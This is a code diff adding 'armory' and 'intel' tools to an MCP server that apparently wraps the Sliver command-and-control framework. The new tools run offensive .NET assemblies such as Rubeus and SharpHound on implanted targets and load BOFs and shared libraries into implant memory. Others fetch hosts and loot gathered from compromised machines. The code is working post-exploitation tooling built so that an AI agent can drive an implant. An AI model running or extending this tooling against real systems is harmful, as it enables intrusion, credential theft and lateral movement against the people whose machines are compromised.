@@ -12,6 +12,10 @@ from typing import Any, Optional
 
 from mcp.server.fastmcp import Context, FastMCP
 
+from sliver_mcp.armory import (
+    ArmoryEntry, find_alias, find_extension, pack_bof_args, pack_bof_envelope,
+    scan_aliases, scan_extensions, sha256_hex,
+)
 from sliver_mcp.client import SliverCtx, sliver_lifespan
 from sliver_mcp.serializers import (
     b64d, b64e, decode_text_fields, err, fmt, pb_list_to_dicts, pb_to_dict,
@@ -716,6 +720,358 @@ async def session_pivot_listeners(ctx: Context, session_id: str) -> str:
     if s is None:
         return err("session not found", session_id=session_id)
     return fmt(decode_text_fields(pb_list_to_dicts(await s.pivot_listeners())))
+
+
+# ============================================================================
+# ARMORY (aliases + extensions)
+# ============================================================================
+
+async def _target_meta(ctx: Context, target_kind: str, target_id: str) -> dict:
+    """Return {os, arch} for a session or beacon id."""
+    sctx = _ctx(ctx)
+    if target_kind == "session":
+        s = await sctx.client.session_by_id(target_id)
+        if s is None:
+            raise LookupError(f"session not found: {target_id}")
+        return {"os": s.OS, "arch": s.Arch}
+    b = await sctx.client.beacon_by_id(target_id)
+    if b is None:
+        raise LookupError(f"beacon not found: {target_id}")
+    return {"os": b.OS, "arch": b.Arch}
+
+
+@mcp.tool()
+async def armory_list_aliases(ctx: Context) -> str:
+    """List installed Sliver armory aliases (.NET assemblies like Rubeus, SharpHound, Seatbelt)."""
+    return fmt([e.summary() for e in scan_aliases()])
+
+
+@mcp.tool()
+async def armory_list_extensions(ctx: Context) -> str:
+    """List installed Sliver armory extensions (BOFs, shared libs like kerberoast, c2tc-*)."""
+    return fmt([e.summary() for e in scan_extensions()])
+
+
+@mcp.tool()
+async def armory_alias_info(ctx: Context, command_name: str) -> str:
+    """Return the full alias.json manifest for an installed alias."""
+    e = find_alias(command_name)
+    if not e:
+        return err("alias not found", command_name=command_name)
+    return fmt(e.raw)
+
+
+@mcp.tool()
+async def armory_extension_info(ctx: Context, command_name: str) -> str:
+    """Return the full extension.json manifest for an installed extension."""
+    e = find_extension(command_name)
+    if not e:
+        return err("extension not found", command_name=command_name)
+    return fmt(e.raw)
+
+
+@mcp.tool()
+async def armory_run_alias(
+    ctx: Context, target_kind: str, target_id: str,
+    command_name: str,
+    arguments: str = "",
+    process: str = "notepad.exe",
+    arch: Optional[str] = None,
+) -> str:
+    """Run an armory alias as a .NET assembly on the target.
+
+    Auto-detects target arch (amd64→x64 / 386→x86) and picks matching binary.
+    `arguments`: string passed to the assembly (e.g., "triage" for Rubeus).
+    """
+    e = find_alias(command_name)
+    if not e:
+        return err("alias not found", command_name=command_name)
+    meta = await _target_meta(ctx, target_kind, target_id)
+    use_arch = arch or meta["arch"]
+    binary = e.resolve_binary(meta["os"], use_arch)
+    if binary is None:
+        return err("no matching binary", alias=command_name, os=meta["os"], arch=use_arch, files=[f"{f.os}/{f.arch}" for f in e.files])
+    # Sliver execute_assembly `arch` arg is "x86"|"x64"
+    arch_label = {"amd64": "x64", "386": "x86", "x86_64": "x64"}.get(use_arch, use_arch)
+    if e.default_args and not arguments:
+        arguments = e.default_args
+    obj, _ = await _resolve(ctx, target_kind, target_id)
+    r = await obj.execute_assembly(
+        binary, arguments, process, False, arch_label,
+        "", "", "",  # class_name, method, app_domain — empty = default
+    )
+    d = decode_text_fields(pb_to_dict(r))
+    d["_alias"] = {"command_name": command_name, "version": e.version, "arch_used": use_arch, "byte_len": len(binary)}
+    return fmt(d)
+
+
+async def _register_one_extension(
+    ctx: Context, target_kind: str, target_id: str,
+    command_name: str, target_arch: str,
+) -> dict:
+    """Register a single extension's dep-loader (shared lib/PE) onto the target.
+
+    Only PE/shared-libs get registered on the target; BOFs (.o) are NOT registered —
+    they're executed via coff-loader at call time. If command_name is a BOF, we
+    register its `depends_on` dep instead (typically coff-loader).
+    Name field == sha256(binary) hex, matching Sliver CLI behavior.
+    """
+    from sliver.pb.sliverpb import sliver_pb2
+    e = find_extension(command_name)
+    if not e:
+        return {"error": f"extension not found: {command_name}"}
+    meta = await _target_meta(ctx, target_kind, target_id)
+    use_arch = target_arch or meta["arch"]
+    is_bof = e.is_bof(meta["os"], use_arch)
+    if is_bof:
+        if not e.depends_on:
+            return {"error": "BOF has no depends_on — cannot determine loader", "command_name": command_name}
+        dep = find_extension(e.depends_on)
+        if not dep:
+            return {"error": f"missing dep loader: {e.depends_on}"}
+        binary = dep.resolve_binary(meta["os"], use_arch)
+        if binary is None:
+            return {"error": "no matching binary for dep", "dep": e.depends_on, "os": meta["os"], "arch": use_arch}
+        registered = dep.command_name
+    else:
+        binary = e.resolve_binary(meta["os"], use_arch)
+        if binary is None:
+            return {"error": "no matching binary", "os": meta["os"], "arch": use_arch}
+        registered = e.command_name
+    obj, _ = await _resolve(ctx, target_kind, target_id)
+    name_hex = sha256_hex(binary)
+    req = sliver_pb2.RegisterExtensionReq(
+        Name=name_hex,
+        Data=binary,
+        OS=meta["os"],
+        Init="",
+    )
+    obj._request(req)
+    try:
+        resp = await obj._stub.RegisterExtension(req, timeout=obj.timeout)
+    except Exception as exc:
+        err_msg = str(exc)
+        # Already loaded is typically benign; Sliver returns error "already exists" or similar.
+        return {"already_loaded_or_error": True, "registered": registered, "sha256": name_hex, "byte_len": len(binary), "error": err_msg}
+    return {
+        "ok": True,
+        "registered": registered,
+        "sha256": name_hex,
+        "byte_len": len(binary),
+        "for_bof": is_bof,
+        "response": pb_to_dict(resp),
+    }
+
+
+@mcp.tool()
+async def armory_register_extension(
+    ctx: Context, target_kind: str, target_id: str,
+    command_name: str,
+    resolve_deps: bool = True,
+    arch: Optional[str] = None,
+) -> str:
+    """Register an armory extension onto the target (loads the BOF/shared-lib into implant memory).
+
+    If `resolve_deps=True` (default), chained `depends_on` entries are registered first.
+    Returns the registration chain status.
+    """
+    meta = await _target_meta(ctx, target_kind, target_id)
+    use_arch = arch or meta["arch"]
+    chain: list[str] = []
+    seen: set[str] = set()
+
+    def _collect(name: str):
+        if name in seen:
+            return
+        e = find_extension(name)
+        if not e:
+            chain.append(f"__missing__:{name}")
+            return
+        if resolve_deps and e.depends_on:
+            _collect(e.depends_on)
+        chain.append(name)
+        seen.add(name)
+
+    _collect(command_name)
+    results = []
+    for n in chain:
+        if n.startswith("__missing__:"):
+            results.append({"name": n.split(":", 1)[1], "error": "extension not found locally"})
+            continue
+        try:
+            results.append(await _register_one_extension(ctx, target_kind, target_id, n, use_arch))
+        except Exception as exc:
+            results.append({"name": n, "error": str(exc)})
+    return fmt({"chain": chain, "results": results})
+
+
+@mcp.tool()
+async def armory_list_registered_extensions(ctx: Context, target_kind: str, target_id: str) -> str:
+    """List extensions currently loaded on the target (remote state)."""
+    from sliver.pb.sliverpb import sliver_pb2
+    obj, _ = await _resolve(ctx, target_kind, target_id)
+    req = sliver_pb2.ListExtensionsReq()
+    obj._request(req)
+    resp = await obj._stub.ListExtensions(req, timeout=obj.timeout)
+    return fmt(pb_to_dict(resp))
+
+
+@mcp.tool()
+async def armory_call_extension(
+    ctx: Context, target_kind: str, target_id: str,
+    command_name: str,
+    export: str = "",
+    args_base64: str = "",
+    server_store: bool = False,
+) -> str:
+    """Call a registered extension with pre-packed args (base64).
+
+    `export`: entrypoint (e.g., "go" for BOFs); defaults to extension manifest's entrypoint.
+    `args_base64`: base64 of BOF-packed args. Use `armory_run_extension` for auto-packing.
+    """
+    from sliver.pb.sliverpb import sliver_pb2
+    e = find_extension(command_name)
+    use_export = export or (e.entrypoint if e else "go")
+    obj, _ = await _resolve(ctx, target_kind, target_id)
+    req = sliver_pb2.CallExtensionReq(
+        Name=command_name,
+        ServerStore=server_store,
+        Args=b64d(args_base64),
+        Export=use_export,
+    )
+    obj._request(req)
+    resp = await obj._stub.CallExtension(req, timeout=obj.timeout)
+    d = decode_text_fields(pb_to_dict(resp))
+    return fmt(d)
+
+
+@mcp.tool()
+async def armory_run_extension(
+    ctx: Context, target_kind: str, target_id: str,
+    command_name: str,
+    arguments: Optional[list] = None,
+    register: bool = True,
+    resolve_deps: bool = True,
+) -> str:
+    """High-level: auto-register dep loader (for BOFs) or extension PE, pack args, call.
+
+    `arguments`: list of values in the order the manifest defines. Types are taken from the
+    manifest and encoded appropriately (int/short/string/wstring/file).
+    For BOFs, the call routes through the dep's coff-loader with an envelope
+    containing {bof_entrypoint, bof_data, packed_args}; Name is sha256(dep_binary).
+    """
+    from sliver.pb.sliverpb import sliver_pb2
+    import json as _json
+
+    e = find_extension(command_name)
+    if not e:
+        return err("extension not found", command_name=command_name)
+
+    meta = await _target_meta(ctx, target_kind, target_id)
+    use_arch = meta["arch"]
+    is_bof = e.is_bof(meta["os"], use_arch)
+    bof_binary: Optional[bytes] = None
+    dep_binary: Optional[bytes] = None
+    dep_entrypoint = ""
+    if is_bof:
+        if not e.depends_on:
+            return err("BOF has no depends_on", command_name=command_name)
+        dep = find_extension(e.depends_on)
+        if not dep:
+            return err("dep loader not installed", depends_on=e.depends_on)
+        bof_binary = e.resolve_binary(meta["os"], use_arch)
+        dep_binary = dep.resolve_binary(meta["os"], use_arch)
+        if bof_binary is None or dep_binary is None:
+            return err("missing binary", bof=bof_binary is not None, dep=dep_binary is not None, os=meta["os"], arch=use_arch)
+        dep_entrypoint = dep.entrypoint or "go"
+    else:
+        dep_binary = e.resolve_binary(meta["os"], use_arch)
+        if dep_binary is None:
+            return err("no matching binary", os=meta["os"], arch=use_arch)
+
+    reg_result = None
+    if register:
+        reg_json = await armory_register_extension(ctx, target_kind, target_id, command_name, resolve_deps)  # type: ignore[arg-type]
+        try: reg_result = _json.loads(reg_json)
+        except Exception: reg_result = {"raw": reg_json}
+
+    try:
+        packed_inner_args = pack_bof_args(e.raw.get("arguments", []), arguments or [])
+    except Exception as exc:
+        return err(f"arg packing failed: {exc}", arguments_spec=e.raw.get("arguments", []))
+
+    # Build the CallExtension request per BOF vs PE path
+    obj, _ = await _resolve(ctx, target_kind, target_id)
+    if is_bof:
+        envelope = pack_bof_envelope(e.entrypoint or "go", bof_binary or b"", packed_inner_args)
+        call_name = sha256_hex(dep_binary or b"")
+        call_export = dep_entrypoint
+        call_args = envelope
+    else:
+        call_name = sha256_hex(dep_binary or b"")
+        call_export = e.entrypoint or "go"
+        call_args = packed_inner_args
+
+    req = sliver_pb2.CallExtensionReq(
+        Name=call_name,
+        Args=call_args,
+        Export=call_export,
+    )
+    obj._request(req)
+    try:
+        resp = await obj._stub.CallExtension(req, timeout=obj.timeout)
+    except Exception as exc:
+        return fmt({"register": reg_result, "call_error": str(exc)})
+    call_result = decode_text_fields(pb_to_dict(resp))
+    return fmt({
+        "register": reg_result,
+        "call_meta": {"is_bof": is_bof, "name_sha256": call_name, "export": call_export, "args_bytes": len(call_args)},
+        "call": call_result,
+    })
+
+
+# ============================================================================
+# INTEL (raw gRPC — creds/hosts/loot not exposed by sliver-py)
+# ============================================================================
+
+@mcp.tool()
+async def list_hosts(ctx: Context) -> str:
+    """List known hosts from the Sliver intel database."""
+    from sliver.pb.commonpb import common_pb2
+    stub = _ctx(ctx).client._stub
+    resp = await stub.Hosts(common_pb2.Empty(), timeout=60)
+    return fmt(decode_text_fields(pb_to_dict(resp)))
+
+
+@mcp.tool()
+async def list_loot(ctx: Context) -> str:
+    """List all loot items in the Sliver loot store."""
+    from sliver.pb.commonpb import common_pb2
+    stub = _ctx(ctx).client._stub
+    resp = await stub.LootAll(common_pb2.Empty(), timeout=60)
+    return fmt(decode_text_fields(pb_to_dict(resp)))
+
+
+@mcp.tool()
+async def loot_content(ctx: Context, loot_id: str) -> str:
+    """Fetch the body of a loot item by ID. Binary blobs are returned base64 under `File.Data`."""
+    from sliver.pb.clientpb import client_pb2
+    stub = _ctx(ctx).client._stub
+    req = client_pb2.Loot(LootID=loot_id)
+    resp = await stub.LootContent(req, timeout=60)
+    d = pb_to_dict(resp)
+    raw = getattr(resp.File, "Data", b"") if resp and resp.File else b""
+    if raw:
+        d.setdefault("File", {})
+        d["File"]["data_base64"] = b64e(raw)
+        d["File"]["byte_len"] = len(raw)
+    return fmt(decode_text_fields(d))
+
+
+@mcp.tool()
+async def list_canaries(ctx: Context) -> str:
+    """List DNS canaries configured on implants."""
+    return fmt(decode_text_fields(pb_list_to_dicts(await _ctx(ctx).client.canaries())))
 
 
 # ============================================================================
